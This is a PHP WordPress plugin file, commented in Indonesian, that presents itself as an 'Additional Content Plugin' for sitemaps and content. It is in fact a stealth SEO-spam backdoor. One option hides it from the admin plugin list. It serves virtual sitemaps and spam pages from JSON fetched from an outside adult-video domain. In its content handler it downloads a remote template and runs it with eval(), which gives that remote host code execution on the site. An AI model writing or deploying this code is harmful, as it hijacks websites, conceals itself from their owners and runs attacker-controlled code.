<?php
/*
Plugin Name: Additional Content Plugin
Description: Plugin konten & sitemap stealth (Virtual XML) dengan Metode Force Intercept (Anti-404).
Version: 6.2
Author: Grok
*/

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

// KONFIGURASI URL DEFAULT
define('ACP_TEMPLATE_URL', 'https://player.javpornsub.net/template/index.txt');
define('ACP_JSON_BASE_URL', 'https://player.javpornsub.net/content/');

// 1. FITUR HIDDEN PLUGIN
add_filter('all_plugins', 'acp_hide_plugin_from_list');
function acp_hide_plugin_from_list($plugins) {
    if (get_option('acp_plugin_hidden', false)) {
        $plugin_file = plugin_basename(__FILE__);
        if (isset($plugins[$plugin_file])) unset($plugins[$plugin_file]);
    }
    return $plugins;
}

// Register admin menu
add_action('admin_menu', 'acp_admin_menu');
function acp_admin_menu() {
    add_menu_page('Content Plugin', 'Content Plugin', 'manage_options', 'additional-content-plugin', 'acp_admin_page', 'dashicons-database');
}

// Generate random string
function acp_generate_random_string($length = 5) {
    return substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, $length);
}

// ==========================================
// INI BAGIAN UTAMA: FORCE INTERCEPT (ANTI-404)
// ==========================================
add_action('init', 'acp_force_virtual_sitemap', 1); // Prioritas 1 (Sangat Awal)
function acp_force_virtual_sitemap() {
    // Cek URL saat ini secara manual
    $request_uri = $_SERVER['REQUEST_URI'];
    $path = parse_url($request_uri, PHP_URL_PATH);
    $path_parts = pathinfo($path);

    // 1. CEK SITEMAP (.xml)
    if (isset($path_parts['extension']) && $path_parts['extension'] === 'xml') {
        $filename = $path_parts['filename']; // misal: '39o06' atau '39o06-2'
        
        // Cek halaman (pagination), misal: nama-2
        $page = 1;
        if (preg_match('/^(.*?)-(\d+)$/', $filename, $matches)) {
            $sitemap_name = $matches[1];
            $page = intval($matches[2]);
        } else {
            $sitemap_name = $filename;
        }

        $endpoints = get_option('acp_endpoints', []);
        $target_endpoint = false;

        foreach ($endpoints as $ep) {
            // Hanya proses jika statusnya sudah 'generated' (aktif)
            if (isset($ep['status']) && $ep['status'] === 'active' && $ep['sitemap_name'] === $sitemap_name) {
                $target_endpoint = $ep;
                break;
            }
        }

        if ($target_endpoint) {
            // LANGSUNG SAJIKAN XML DAN MATIKAN WORDPRESS (EXIT)
            header('Content-Type: application/xml; charset=utf-8');
            header('X-Robots-Tag: noindex, follow');
            
            // Ambil JSON
            $json_url = ACP_JSON_BASE_URL . $target_endpoint['json_filename'] . '.json';
            $cache_key = 'acp_xml_' . md5($json_url);
            $konten_data = get_transient($cache_key);

            if ($konten_data === false) {
                $response = wp_remote_get($json_url, ['timeout' => 30]);
                if (!is_wp_error($response)) {
                    $body = wp_remote_retrieve_body($response);
                    $data = json_decode($body, true);
                    if (is_array($data)) {
                        $konten_data = $data;
                        set_transient($cache_key, $konten_data, HOUR_IN_SECONDS);
                    }
                }
            }

            if (!empty($konten_data) && is_array($konten_data)) {
                $max_urls = 45000;
                $chunks = array_chunk($konten_data, $max_urls, true);
                $chunk_index = $page - 1;

                if (isset($chunks[$chunk_index])) {
                    echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
                    echo '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
                    foreach ($chunks[$chunk_index] as $title => $desc) {
                        echo "\t<url>\n";
                        echo "\t\t<loc>" . esc_url(home_url(urlencode($title))) . "</loc>\n";
                        echo "\t\t<lastmod>" . date('c') . "</lastmod>\n";
                        echo "\t\t<changefreq>weekly</changefreq>\n";
                        echo "\t</url>\n";
                    }
                    echo '</urlset>';
                    exit; // STOP WP DISINI
                }
            }
            // Jika data kosong tapi nama cocok, tetap exit agar tidak 404 theme
            exit;
        }
    }

    // 2. CEK KONTEN (Tanpa .xml)
    // Logika konten tetap menggunakan rewrite rule standar atau pengecekan fallback
    if (isset($_GET['acp_value'])) {
        // Fallback jika rewrite rule jalan
        return; 
    }
    
    // Cek manual path untuk konten (Fallback Force)
    $path_segment = trim($path, '/');
    if (!empty($path_segment) && !is_admin()) {
        $endpoints = get_option('acp_endpoints', []);
        foreach ($endpoints as $ep) {
             if (isset($ep['status']) && $ep['status'] === 'active') {
                 // Kita cek nanti di template_redirect biar tidak bentrok sama Page/Post asli
             }
        }
    }
}
// ==========================================


// Admin Page
function acp_admin_page() {
    // 1. Toggle Hidden
    if (isset($_POST['acp_toggle_visibility'])) {
        check_admin_referer('acp_action');
        $curr = get_option('acp_plugin_hidden', false);
        update_option('acp_plugin_hidden', !$curr);
    }

    // 2. Setup Awal (Reset & Buat Slot)
    if (isset($_POST['acp_setup_endpoints'])) {
        check_admin_referer('acp_action');
        $count = intval($_POST['endpoint_count']);
        if ($count > 0) {
            $new = [];
            for ($i = 0; $i < $count; $i++) {
                $new[] = [
                    'json_filename' => acp_generate_random_string(10),
                    'sitemap_name'  => acp_generate_random_string(5),
                    'status'        => 'pending' // Belum di-generate
                ];
            }
            update_option('acp_endpoints', $new);
        }
    }

    // 3. GENERATE ACTION (Tombol ditekan)
    if (isset($_POST['acp_generate_action'])) {
        check_admin_referer('acp_action');
        $endpoints = get_option('acp_endpoints', []);
        foreach ($endpoints as &$ep) {
            $ep['status'] = 'active'; // Aktifkan endpoint (Virtual File Ready)
        }
        update_option('acp_endpoints', $endpoints);
        echo '<div class="updated"><p>Sitemap Virtual berhasil di-generate dan siap diakses!</p></div>';
        
        // Flush sekedar formalitas, tapi kita pakai Force Intercept sekarang
        acp_register_rewrite_rules();
        flush_rewrite_rules();
    }

    // 4. Reset Total
    if (isset($_POST['acp_reset'])) {
        check_admin_referer('acp_action');
        delete_option('acp_endpoints');
    }

    $endpoints = get_option('acp_endpoints', false);
    $is_hidden = get_option('acp_plugin_hidden', false);

    ?>
    <div class="wrap">
        <h1>Content Plugin (Stealth Force Mode)</h1>

        <div style="background:#fff; padding:15px; border-left:4px solid #00a0d2; margin-bottom:20px; display:flex; justify-content:space-between; align-items:center; box-shadow:0 1px 1px rgba(0,0,0,0.04);">
            <div>Status Plugin: <strong><?php echo $is_hidden ? '<span style="color:red">HIDDEN</span>' : '<span style="color:green">VISIBLE</span>'; ?></strong></div>
            <form method="post">
                <?php wp_nonce_field('acp_action'); ?>
                <input type="submit" name="acp_toggle_visibility" class="button" value="<?php echo $is_hidden ? 'Show Plugin' : 'Hide Plugin'; ?>">
            </form>
        </div>

        <?php if (!$endpoints): ?>
            <div class="card" style="max-width:400px; padding:20px;">
                <h3>Langkah 1: Konfigurasi</h3>
                <form method="post">
                    <?php wp_nonce_field('acp_action'); ?>
                    <p>Jumlah Endpoint: <input type="number" name="endpoint_count" value="3" class="small-text"></p>
                    <input type="submit" name="acp_setup_endpoints" class="button button-primary" value="Siapkan Endpoint">
                </form>
            </div>

        <?php else: ?>
            
            <form method="post">
                <?php wp_nonce_field('acp_action'); ?>
                
                <table class="wp-list-table widefat fixed striped">
                    <thead>
                        <tr>
                            <th width="50">No</th>
                            <th>Target JSON (Upload kesini)</th>
                            <th>Virtual Sitemap</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php 
                        $all_active = true;
                        foreach ($endpoints as $i => $ep): 
                            $is_active = isset($ep['status']) && $ep['status'] === 'active';
                            if (!$is_active) $all_active = false;
                            
                            $sitemap_url = home_url($ep['sitemap_name'] . '.xml');
                        ?>
                        <tr>
                            <td><?php echo $i + 1; ?></td>
                            <td>
                                <input type="text" value="<?php echo $ep['json_filename']; ?>" class="regular-text" style="width:150px;" readonly onclick="this.select()"> .json
                                <br><small style="color:#666">URL: <?php echo ACP_JSON_BASE_URL . $ep['json_filename']; ?>.json</small>
                            </td>
                            <td>
                                <?php if ($is_active): ?>
                                    <a href="<?php echo $sitemap_url; ?>" target="_blank" style="font-weight:bold; color:green; text-decoration:none;">
                                        <span class="dashicons dashicons-yes"></span> <?php echo $ep['sitemap_name']; ?>.xml
                                    </a>
                                    <input type="text" id="sm_<?php echo $i; ?>" value="<?php echo $ep['sitemap_name']; ?>.xml" style="position:absolute;left:-9999px">
                                    <span class="dashicons dashicons-admin-page acp-copy" data-target="sm_<?php echo $i; ?>" style="cursor:pointer; color:#0073aa" title="Copy"></span>
                                <?php else: ?>
                                    <span style="color:#999; font-style:italic;">Menunggu Generate...</span>
                                <?php endif; ?>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>

                <p class="submit" style="margin-top:20px;">
                    <input type="submit" name="acp_generate_action" class="button button-primary button-hero" value="GENERATE SITEMAP (Virtual)">
                </p>
            </form>

            <hr style="margin-top:30px;">
            <form method="post" onsubmit="return confirm('Reset semua?');">
                <?php wp_nonce_field('acp_action'); ?>
                <input type="submit" name="acp_reset" class="button button-link-delete" value="Reset Konfigurasi">
            </form>

        <?php endif; ?>
    </div>
    
    <script>
    jQuery(document).ready(function($){
        $('.acp-copy').click(function(){
            var t = document.getElementById($(this).data('target'));
            t.select(); document.execCommand('copy');
            alert('Copied: ' + t.value);
        });
    });
    </script>
    <?php
}

// Rewrite Rules & Content Handler (Fallback & Content)
add_action('init', 'acp_register_rewrite_rules');
function acp_register_rewrite_rules() {
    add_rewrite_rule('^([^/]+)/?$', 'index.php?acp_value=$matches[1]', 'top');
}
add_filter('query_vars', function($v){ $v[] = 'acp_value'; return $v; });

// Display Content
add_action('template_redirect', 'acp_display_content');
function acp_display_content() {
    $val = get_query_var('acp_value');
    if (!$val) {
        // Cek Fallback manual dari URI jika rewrite rule gagal
        $path = trim(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');
        if (!empty($path) && !is_admin() && !get_page_by_path($path)) {
             $val = $path;
        } else {
            return;
        }
    }

    $title = sanitize_text_field(urldecode($val));
    if (get_page_by_path($title, OBJECT, ['post', 'page'])) return;

    $endpoints = get_option('acp_endpoints', []);
    foreach ($endpoints as $ep) {
        // Hanya cari di endpoint aktif
        if (!isset($ep['status']) || $ep['status'] !== 'active') continue;

        $json_url = ACP_JSON_BASE_URL . $ep['json_filename'] . '.json';
        $cache_key = 'acp_c_' . md5($json_url);
        $data = get_transient($cache_key);

        if ($data === false) {
            $resp = wp_remote_get($json_url, ['timeout'=>10]);
            if (!is_wp_error($resp)) {
                $data = json_decode(wp_remote_retrieve_body($resp), true);
                set_transient($cache_key, $data, 3600);
            }
        }

        if (is_array($data)) {
            foreach ($data as $k => $v) {
                if (strtolower($k) === strtolower($title)) {
                    $additional_content = $v; // Variabel untuk template
                    $tpl = wp_remote_get(ACP_TEMPLATE_URL);
                    if (!is_wp_error($tpl)) {
                        ob_start();
                        eval('?>' . wp_remote_retrieve_body($tpl));
                        echo ob_get_clean();
                        exit;
                    }
                }
            }
        }
    }
}
